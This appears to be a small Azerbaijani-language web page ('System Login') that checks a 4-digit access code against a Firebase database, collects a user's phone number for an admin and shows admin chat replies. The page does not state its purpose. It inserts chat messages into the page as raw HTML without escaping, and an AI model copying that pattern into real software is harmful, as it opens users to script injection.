<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Girişi</title>
    <style>
        body {
            background-color: #080808;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .neon-box {
            background: #121212;
            border: 2px solid #00ffcc;
            box-shadow: 0 0 25px rgba(0, 255, 204, 0.4);
            padding: 35px;
            border-radius: 15px;
            width: 360px;
            text-align: center;
            box-sizing: border-box;
        }
        h2 {
            color: #00ffcc;
            margin-bottom: 20px;
            text-shadow: 0 0 10px rgba(0, 255, 204, 0.5);
        }
        input, select {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            background: #1a1a1a;
            border: 1px solid #00ffcc;
            color: #fff;
            border-radius: 8px;
            box-sizing: border-box;
            outline: none;
            font-size: 14px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #00ffcc;
            color: #000;
            font-weight: bold;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 10px;
            font-size: 15px;
            box-shadow: 0 0 10px rgba(0, 255, 204, 0.3);
        }
        button:disabled {
            background: #333;
            color: #666;
            cursor: not-allowed;
            box-shadow: none;
        }
        .warning {
            font-size: 11px;
            color: #ff4444;
            margin-top: 15px;
            line-height: 1.4;
        }
        #statusMsg {
            font-size: 15px;
            font-weight: bold;
            color: #00ffcc;
            margin-top: 15px;
            text-shadow: 0 0 8px rgba(0, 255, 204, 0.4);
        }
        .chat-box {
            margin-top: 15px;
            text-align: left;
            border-top: 1px solid #333;
            padding-top: 10px;
            max-height: 120px;
            overflow-y: auto;
            font-size: 13px;
        }
    </style>
</head>
<body>

    <div class="neon-box">
        <h2>Sistem Girişi</h2>
        
        <!-- 1-ci Addım: Kod -->
        <div id="step1">
            <input type="text" id="accessCode" placeholder="4 rəqəmli kodu daxil edin" maxlength="4">
            <button onclick="checkCode()">Daxil ol</button>
            <p class="warning">Bu kodu başqasına versəz hesab banlanacaq!</p>
        </div>

        <!-- 2-ci Addım: Nömrə və Müraciət -->
        <div id="step2" style="display:none;">
            <select id="countryCode">
                <option value="">Ölkə kodu seçin</option>
                <option value="+994">+994 (Azərbaycan)</option>
                <option value="+90">+90 (Türkiyə)</option>
                <option value="+7">+7 (Rusiya)</option>
            </select>
            <input type="text" id="phoneNumber" placeholder="Nömrəni daxil edin" oninput="validateForm()">
            <button id="startBtn" onclick="submitData()" disabled>İşləmə başla</button>
            <p id="statusMsg"></p>

            <!-- Admindən gələn mesajlar / cavablar -->
            <div id="adminResponseArea" style="display:none;">
                <div class="chat-box" id="chatMessages">
                    <p style="color: #888;">Admindən cavab gözlənilir...</p>
                </div>
            </div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <script>
        const firebaseConfig = {
            databaseURL: "https://ahhseks-default-rtdb.europe-west1.firebasedatabase.app/"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let currentCode = "";

        function checkCode() {
            const code = document.getElementById("accessCode").value.trim();
            if (code.length !== 4) {
                alert("Zəhmət olmasa 4 rəqəmli kodu tam daxil edin.");
                return;
            }

            db.ref("codes/" + code).once("value", snapshot => {
                const data = snapshot.val();
                if (data) {
                    if (data.banned || data.active === false) {
                        alert("Bu kod banlanıb və ya etibarsızdır!");
                        return;
                    }
                    currentCode = code;
                    document.getElementById("step1").style.display = "none";
                    document.getElementById("step2").style.display = "block";
                } else {
                    alert("Yanlış və ya mövcud olmayan kod!");
                }
            });
        }

        const phoneInput = document.getElementById("phoneNumber");
        const countrySelect = document.getElementById("countryCode");
        const startBtn = document.getElementById("startBtn");

        countrySelect.addEventListener("change", validateForm);
        phoneInput.addEventListener("input", validateForm);

        function validateForm() {
            if (countrySelect.value !== "" && phoneInput.value.trim() !== "") {
                startBtn.disabled = false;
            } else {
                startBtn.disabled = true;
            }
        }

        function submitData() {
            const fullPhone = countrySelect.value + phoneInput.value.trim();
            
            // Sorğunu və nömrəni Firebase-ə yazırıq (Admin görəcək)
            db.ref("requests/" + currentCode).set({
                code: currentCode,
                phone: fullPhone,
                timestamp: Date.now()
            });

            // Kurs tələbinə uyğun olaraq ekran "işləm aparılır" yazısında qalır
            startBtn.disabled = true;
            countrySelect.disabled = true;
            phoneInput.disabled = true;
            document.getElementById("statusMsg").innerText = "İşləm aparılır...";
            document.getElementById("adminResponseArea").style.display = "block";

            // Admindən gələn cavabları dinləyirik
            db.ref("chats/" + currentCode).on("value", snapshot => {
                const chatDiv = document.getElementById("chatMessages");
                chatDiv.innerHTML = "";
                if (snapshot.exists()) {
                    snapshot.forEach(child => {
                        const msg = child.val();
                        chatDiv.innerHTML += `<p><b>${msg.sender}:</b> ${msg.text}</p>`;
                    });
                }
            });

            // Ban statusunu yoxla (əgər admin banlasa)
            db.ref("codes/" + currentCode + "/banned").on("value", snapshot => {
                if (snapshot.val() === true) {
                    alert("Hesabınız banlandı!");
                    location.reload();
                }
            });
        }
    </script>
</body>
</html>
